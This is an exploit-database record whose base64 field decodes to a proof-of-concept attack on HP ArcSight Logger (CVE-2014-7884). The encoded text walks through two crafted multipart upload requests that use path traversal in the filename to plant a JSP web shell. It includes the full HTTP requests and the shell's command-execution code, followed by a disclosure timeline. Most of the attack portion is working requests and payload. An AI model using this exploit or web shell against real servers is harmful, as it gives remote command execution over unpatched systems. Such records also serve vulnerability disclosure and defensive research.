{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBBcmNTaWdodCBMb2dnZXIgLSBBcmJpdHJhcnkgRmlsZSBVcGxvYWQgKENvZGUgRXhlY3V0aW9uKQ0KIyBEYXRlOiAxMy4wMy4yMDE1DQojIEV4cGxvaXQgQXV0aG9yOiBKdWxpYW4gSG9yb3N6a2lld2ljeg0KIyBWZW5kb3IgSG9tZXBhZ2U6IHd3dy5ocC5jb20NCiMgU29mdHdhcmUgTGluazogaHR0cDovL3d3dzguaHAuY29tL3VzL2VuL3NvZnR3YXJlLXNvbHV0aW9ucy9hcmNzaWdodC1sb2dnZXItbG9nLW1hbmFnZW1lbnQvdHJ5LW5vdy5odG1sDQojIFZlcnNpb246IEFyY1NpZ2h0IExvZ2dlciA1LjMuMS42ODM4LjAgYW5kIHByaW9yIHZlcnNpb25zDQojIFRlc3RlZCBvbjogUmVkIEhhdCBMaW51eA0KIyBDVkU6IENWRS0yMDE0LTc4ODQNCg0KWyBEZXNjcmlwdGlvbiBdDQpDb25maWd1cmF0aW9uIGltcG9ydCBmaWxlIHVwbG9hZCBjYXBhYmlsaXR5IGRvZXMgbm90IGZ1bGx5IHNhbml0aXplIGZpbGUgbmFtZXMsIHdoaWNoIGFsbG93cyBhdHRhY2tlcnMgdG8gcHV0IGV4ZWN1dGFibGUgZmlsZXMgaW50byB0aGUgZG9jdW1lbnQgcm9vdC4gVXBsb2FkIG9mIHNlcnZlciBzaWRlIChKU1ApIHNjcmlwdCB3aXRoIHNoZWxsIGFjY2Vzc2luZyBmdW5jdGlvbiBpbiBvcmRlciB0byBnYWluIHJlbW90ZSBPUyBjb21tYW5kIGV4ZWN1dGlvbiBoYXMgYmVlbiBjb25kdWN0ZWQgaW4gdGhlIFBPQy4gVG8gYWNjZXNzIHZ1bG5lcmFibGUgZmVhdHVyZSwgdXNlciBoYXMgdG8gYmUgYXV0aGVudGljYXRlZCBpbiB0aGUgY29uc29sZS4gRmVhdHVyZSBpcyBhdmFpbGFibGUgdG8gYWxsIHVzZXJzLCBhbHNvIG5vbi1hZG1pbmlzdHJhdGl2ZSBvbmVzLiBTaGVsbCBjb21tYW5kcyBhcmUgZXhlY3V0ZWQgd2l0aCBkZWZhdWx0IE5QQSBwcml2aWxlZ2VzIChhcmNzaWdodCkgZ2l2aW5nIGZ1bGwgY29udHJvbCBvdmVyIHRoZSBzZXJ2aWNlIChmb3IgaW5zdGFuY2UgL2V0Yy9pbml0LmQvYXJjc2lnaHRfbG9nZ2VyIHN0b3AgaGFzIGJlZW4gc3VjY2Vzc2Z1bGx5IHBlcmZvcm1lZCkuIFRoZSBjdWxwcml0IGZlYXR1cmUgaXMgYWNjZXNzaWJsZSB0byBhbGwgYXV0aGVudGljYXRlZCB1c2VycywgaW5jbHVkaW5nIG9uZXMgd2l0aCBzb2xlIHJlYWQtb25seSBhZG1pbiByb2xlLg0KDQoNClsgUHJvb2Ygb2YgQ29uY2VwdCBdDQpBdHRlbnRpb24sIHRvIHJlcHJvZHVjZSB0aGUgYXR0YWNrIGZvciB0aGUgZmlyc3QgdGltZSwgdHdvIHJlcXVlc3RzIGFyZSByZXF1aXJlZC4NCkZpcnN0IHJlcXVlc3QgbWFnaWNhbGx5IGNyZWF0ZXMgc3ViZGlyZWN0b3J5IGluIHRoZSAvb3B0L2FyY3NpZ2h0L2N1cnJlbnQvYmFja3VwcyB1cGxvYWQgZGlyLg0KU2Vjb25kIG9uZSBwdXRzIHRoZSBhY3R1YWwgSlNQIHdlYiBzaGVsbCBpbnRvIHRoZSBkb2N1bWVudCByb290LCBieSB1c2luZyBwYXRoIHRyYXZlcnNhbCByZWZlcmluZyB0byB0aGUgdXBsb2FkIGRpciBzdWJkaXJlY3RvcnkuDQpPdGhlciBjb21iaW5hdGlvbnMgb2YgZGlyZWN0IG5hbWUgbWFuaXB1bGF0aW9uIGluIG9yZGVyIHRvIHVwbG9hZCBhbnl0aGluZyB0byB0aGUgZG9jdW1lbnQgcm9vdCBkaWQgbm90IHN1Y2NlZWQgZHVyaW5nIHRoZSB0ZXN0IChyZWZlcmVuY2VzIHRvIHRoZSB1cGxvYWQgZGlyIHdpdGhvdXQgYSBzdWJkaXJlY3Rvcnkgd2VyZSByZWZ1c2VkIGJ5IHRoZSBhcHBsaWNhdGlvbikuDQpUaGUgb25seSByZXF1aXJlZCBkaWZmZXJlbmNlIGJldHdlZW4gdGhlIHJlcXVlc3RzIHRvIGFjaGlldmUgc3VjY2Vzc2Z1bCB1cGxvYWQgaW50byBkZXNpcmVkIGxvY2F0aW9uIGlzIHRoZSBmaWxlbmFtZSBwcm9wZXJ0eSBpbiB0aGUgQ29udGVudC1EaXNwb3NpdGlvbiBIVFRQIGhlYWRlci4NCg0KVGhlIGdlbmVyYWwgcnVsZSBpcyBhcyBmb2xsb3dzOg0KRmlyc3QgcmVxdWVzdCAoY3JlYXRlIC9vcHQvYXJjc2lnaHQvY3VycmVudC9iYWNrdXBzL3NvbWVfbmV3X2RpciBkaXJlY3RvcnksIHRoZSB1cGxvYWRlZCBmaWxlIGlzIGlycmVsZXZhbnQpOg0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWVsZC1pbXBvcnRGaWxlIjsgZmlsZW5hbWU9InNvbWVfbmV3X2Rpci93aGF0ZXZlciINClNlY29uZCByZXF1ZXN0ICh1cGxvYWQgdGhlIGZpbGUgaW50byBsb2NhdGlvbiBvZiBjaG9pY2UgYnkgdHJhdmVyc2FsbHkgcmVmZXJpbmcgdG8gdGhhdCBzdWJkaXJlY3RvcnkpOg0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWVsZC1pbXBvcnRGaWxlIjsgZmlsZW5hbWU9InNvbWVfbmV3X2Rpci8uLi8uLi9sb2NhbC90b21jYXQvd2ViYXBwcy9sb2dnZXIvaGVsbGNvZGUuanNwIg0KDQpQbGVhc2UgYWxzbyBub3RlIHRoYXQgdmFsaWQgdG9rZW5zIChhc2ZfdG9rZW4sIHNlc3Npb25fc3RyaW5nLCBKU0VTU0lPTklEKSBhcmUgcmVxdWlyZWQuDQpUaGUgbW9zdCBlZmZpY2llbnQgd2F5IHRvIHJlcHJvZHVjZSB0aGlzIGlzOg0KMSkgbmFtZSB0aGUgbG9jYWwgSlNQIHdlYiBzaGVsbCBmaWxlIHRvYW55dGhpbmcueG1sLmd6IGV4dGVuc2lvbg0KMikgY2hvb3NlIHRvIGltcG9ydCBpdCBpbiB0aGUgQ29uZmlndXJhdGlvbi0+Q29udGVudCBNYW5hZ2VtZW50LT5JbXBvcnQgc2VjdGlvbiB0aHJvdWdoIHRoZSB3ZWIgYnJvd3Nlcg0KMykgaW50ZXJjZXB0IHRoZSBicm93c2VyIHRyYWZmaWMgd2l0aCBhIGxvY2FsIHByb3h5IChCdXJwIFN1aXRlIGZvciBpbnN0YW5jZSkNCjQpIGNoYW5nZSB0aGUgZmlsZW5hbWUgcHJvcGVydHkgaW4gdGhlIENvbnRlbnQtRGlzcG9zaXRpb24gaGVhZGVyIHNvIGl0IGNvbnRhaW5zIHRoZSBuYW1lIG9mIG5ldyBzdWJkaXJlY3RvcnkgYW5kIGZvcndhcmQgdGhlIHJlcXVlc3QNCjUpIHNlbmQgYW5vdGhlciBjb3B5IG9mIHRoZSBzYW1lIHJlcXVlc3QsIHRoaXMgdGltZSB3aXRoIGZpbGVuYW1lIHJlZmVycmluZyB0byB0aGUgc3ViZGlyZWN0b3J5IGNyZWF0ZWQgd2l0aCBwcmV2aW91cyByZXF1ZXN0LCB1c2luZyBwYXRoIHRyYXZlcnNhbCB0byBwb2ludCBpbnRvIHRoZSBMb2dnZXIgZG9jdW1lbnQgcm9vdCwgc3VjY2Vzc2Z1bGx5IHVwbG9hZGluZyB0aGUgd2ViIHNoZWxsLg0KNikgTmF2aWdhdGUgdGhlIGJyb3dzZXIgdG8gaHR0cDovL3ZpY3RpbS5jb206OTAwMC9sb2dnZXIvaGVsbGNvZGUuanNwDQoNCkZ1bGwgcmVxdWVzdHM6DQoNClBPU1QgL2xvZ2dlci9pbXBvcnRfY29udGVudF9jb25maWdfdXBsb2FkLmZ0bD8gSFRUUC8xLjENCkhvc3Q6IHZpY3RpbS5jb206OTAwMA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6MzAuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpSZWZlcmVyOiBodHRwczovL3ZpY3RpbS5jb206OTAwMC9sb2dnZXIvaW1wb3J0X2NvbnRlbnRfY29uZmlnX3VwbG9hZC5mdGw/DQpDb29raWU6IGNvbS5hcmNzaWdodC5wcm9kdWN0LnBsYXRmb3JtLmxvZ2dlci5jbGllbnQuc2Vzc2lvbi5TZXNzaW9uQ29udGV4dC5wcm9kdWN0TmFtZT1Mb2dnZXI7IGNvbS5hcmNzaWdodC5wcm9kdWN0LnBsYXRmb3JtLmxvZ2dlci5jbGllbnQuc2Vzc2lvbi5TZXNzaW9uQ29udGV4dC5hcmNzaWdodFByb2R1Y3ROYW1lPUFyY1NpZ2h0JTIwTG9nZ2VyOyBKU0VTU0lPTklEPUY4OTU0MUQxMzZFNThFRkQ0QjIzNzczMTNCNTZCNTk0OyB1c2VyX2lkX3NlcT03OyBzZXNzaW9uX3N0cmluZz1UakYteDFmU1dyS2IzX3RDMG1ZZjdiUTN0Vk1hb0Q2a2ptQkl0bldmdHNrLg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KQ29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzE1MjE2NjExNTMwNQ0KQ29udGVudC1MZW5ndGg6IDE1NjUNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzE1MjE2NjExNTMwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGxvYWRpZCINCg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3MTUyMTY2MTE1MzA1DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwZGF0ZSINCg0KdHJ1ZQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzE1MjE2NjExNTMwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJhc2ZfdG9rZW4iDQoNCjdjYWVhM2YxLTdiZmItNDQxOS1hNGJiLTRhMTllMzgwMGJmZg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzE1MjE2NjExNTMwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWVsZC1pbXBvcnRGaWxlIjsgZmlsZW5hbWU9InNvbWVfbmV3X2Rpci9oZWxsY29kZS5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtZ3ppcA0KDQo8JUAgcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKiIlPg0KPEhUTUw+DQo8VElUTEU+TGF1ZGFudW0gSlNQIFNoZWxsPC9USVRMRT4NCjxCT0RZPg0KQ29tbWFuZHMgd2l0aCBKU1ANCjxGT1JNIE1FVEhPRD0iR0VUIiBOQU1FPSJteWZvcm0iIEFDVElPTj0iIj4NCjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPg0KPElOUFVUIFRZUEU9InN1Ym1pdCIgVkFMVUU9IlNlbmQiPjxici8+DQpJZiB5b3UgdXNlIHRoaXMgYWdhaW5zdCBhIFdpbmRvd3MgYm94IHlvdSBtYXkgbmVlZCB0byBwcmVmaXggeW91ciBjb21tYW5kIHdpdGggY21kLmV4ZSAvYw0KPC9GT1JNPg0KPHByZT4NCjwlDQppZiAocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpICE9IG51bGwpIHsNCm91dC5wcmludGxuKCJDb21tYW5kOiAiICsgcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpICsgIjxCUj4iKTsNClByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsNCk91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7DQpJbnB1dFN0cmVhbSBpbiA9IHAuZ2V0SW5wdXRTdHJlYW0oKTsNCkRhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsNClN0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7DQp3aGlsZSAoIGRpc3IgIT0gbnVsbCApIHsNCm91dC5wcmludGxuKGRpc3IpOw0KZGlzciA9IGRpcy5yZWFkTGluZSgpOw0KfQ0KfQ0KJT4NCjwvcHJlPg0KPGhyLz4NCjxhZGRyZXNzPg0KQ29weXJpZ2h0IMKpIDIwMTIsIDxhIGhyZWY9Im1haWx0bzpsYXVkYW51bUBzZWN1cmVpZGVhcy5uZXQiPktldmluIEpvaG5zb248L2E+IGFuZCB0aGUgTGF1ZGFudW0gdGVhbS48YnIvPg0KV3JpdHRlbiBieSBUaW0gTWVkaW4uPGJyLz4NCkdldCB0aGUgbGF0ZXN0IHZlcnNpb24gYXQgPGEgaHJlZj0iaHR0cDovL2xhdWRhbnVtLnNlY3VyZWlkZWFzLm5ldCI+bGF1ZGFudW0uc2VjdXJlaWRlYXMubmV0PC9hPi4NCjwvYWRkcmVzcz4NCjwvQk9EWT48L0hUTUw+DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTcxNTIxNjYxMTUzMDUtLQ0KDQoNCg0KDQoNCg0KDQpQT1NUIC9sb2dnZXIvaW1wb3J0X2NvbnRlbnRfY29uZmlnX3VwbG9hZC5mdGw/IEhUVFAvMS4xDQpIb3N0OiB2aWN0aW0uY29tOjkwMDANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjMwLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMzAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjogaHR0cHM6Ly92aWN0aW0uY29tOjkwMDAvbG9nZ2VyL2ltcG9ydF9jb250ZW50X2NvbmZpZ191cGxvYWQuZnRsPw0KQ29va2llOiBjb20uYXJjc2lnaHQucHJvZHVjdC5wbGF0Zm9ybS5sb2dnZXIuY2xpZW50LnNlc3Npb24uU2Vzc2lvbkNvbnRleHQucHJvZHVjdE5hbWU9TG9nZ2VyOyBjb20uYXJjc2lnaHQucHJvZHVjdC5wbGF0Zm9ybS5sb2dnZXIuY2xpZW50LnNlc3Npb24uU2Vzc2lvbkNvbnRleHQuYXJjc2lnaHRQcm9kdWN0TmFtZT1BcmNTaWdodCUyMExvZ2dlcjsgSlNFU1NJT05JRD1GODk1NDFEMTM2RTU4RUZENEIyMzc3MzEzQjU2QjU5NDsgdXNlcl9pZF9zZXE9Nzsgc2Vzc2lvbl9zdHJpbmc9VGpGLXgxZlNXcktiM190QzBtWWY3YlEzdFZNYW9ENmtqbUJJdG5XZnRzay4NCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTcxNTIxNjYxMTUzMDUNCkNvbnRlbnQtTGVuZ3RoOiAxNTY1DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTcxNTIxNjYxMTUzMDUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXBsb2FkaWQiDQoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzE1MjE2NjExNTMwNQ0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGRhdGUiDQoNCnRydWUNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTcxNTIxNjYxMTUzMDUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iYXNmX3Rva2VuIg0KDQo3Y2FlYTNmMS03YmZiLTQ0MTktYTRiYi00YTE5ZTM4MDBiZmYNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTcxNTIxNjYxMTUzMDUNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmllbGQtaW1wb3J0RmlsZSI7IGZpbGVuYW1lPSJzb21lX25ld19kaXIvLi4vLi4vbG9jYWwvdG9tY2F0L3dlYmFwcHMvbG9nZ2VyL2hlbGxjb2RlLmpzcCINCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC1nemlwDQoNCjwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YS5pby4qIiU+DQo8SFRNTD4NCjxUSVRMRT5MYXVkYW51bSBKU1AgU2hlbGw8L1RJVExFPg0KPEJPRFk+DQpDb21tYW5kcyB3aXRoIEpTUA0KPEZPUk0gTUVUSE9EPSJHRVQiIE5BTUU9Im15Zm9ybSIgQUNUSU9OPSIiPg0KPElOUFVUIFRZUEU9InRleHQiIE5BTUU9ImNtZCI+DQo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+PGJyLz4NCklmIHlvdSB1c2UgdGhpcyBhZ2FpbnN0IGEgV2luZG93cyBib3ggeW91IG1heSBuZWVkIHRvIHByZWZpeCB5b3VyIGNvbW1hbmQgd2l0aCBjbWQuZXhlIC9jDQo8L0ZPUk0+DQo8cHJlPg0KPCUNCmlmIChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgIT0gbnVsbCkgew0Kb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgKyAiPEJSPiIpOw0KUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpOw0KT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsNCklucHV0U3RyZWFtIGluID0gcC5nZXRJbnB1dFN0cmVhbSgpOw0KRGF0YUlucHV0U3RyZWFtIGRpcyA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oaW4pOw0KU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsNCndoaWxlICggZGlzciAhPSBudWxsICkgew0Kb3V0LnByaW50bG4oZGlzcik7DQpkaXNyID0gZGlzLnJlYWRMaW5lKCk7DQp9DQp9DQolPg0KPC9wcmU+DQo8aHIvPg0KPGFkZHJlc3M+DQpDb3B5cmlnaHQgwqkgMjAxMiwgPGEgaHJlZj0ibWFpbHRvOmxhdWRhbnVtQHNlY3VyZWlkZWFzLm5ldCI+S2V2aW4gSm9obnNvbjwvYT4gYW5kIHRoZSBMYXVkYW51bSB0ZWFtLjxici8+DQpXcml0dGVuIGJ5IFRpbSBNZWRpbi48YnIvPg0KR2V0IHRoZSBsYXRlc3QgdmVyc2lvbiBhdCA8YSBocmVmPSJodHRwOi8vbGF1ZGFudW0uc2VjdXJlaWRlYXMubmV0Ij5sYXVkYW51bS5zZWN1cmVpZGVhcy5uZXQ8L2E+Lg0KPC9hZGRyZXNzPg0KPC9CT0RZPjwvSFRNTD4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzE1MjE2NjExNTMwNS0tDQoNCg0KDQpbIFRpbWUgbGluZSBdDQoyOC4wOC4yMDE0IC0gdnVsbmVyYWJpbGl0eSByZXBvcnQgc2VudCB0byBIUA0KMjEuMDEuMjAxNSAtIG5ldyB2ZXJzaW9uIGNvbnRhaW5pbmcgdGhlIGZpeCByZWxlYXNlZCBieSBIUA0KMTIuMDMuMjAxNSAtIHNlY3VyaXR5IGJ1bGxldGluIHB1Ymxpc2hlZCAoQ1ZFLTIwMTQtNzg4NCkNCg0KDQpbIENyZWRpdHMgXQ0KSnVsaWFuIEhvcm9zemtpZXdpY3ogLSBJVCBTZWN1cml0eSBTcGVjaWFsaXN0IEAgSU5HIFNlcnZpY2VzIFBvbHNrYQ==", 
    "filename": "platforms/linux/remote/36370.txt", 
    "id": "36370", 
    "cves": [
        "CVE-2014-7884"
    ]
}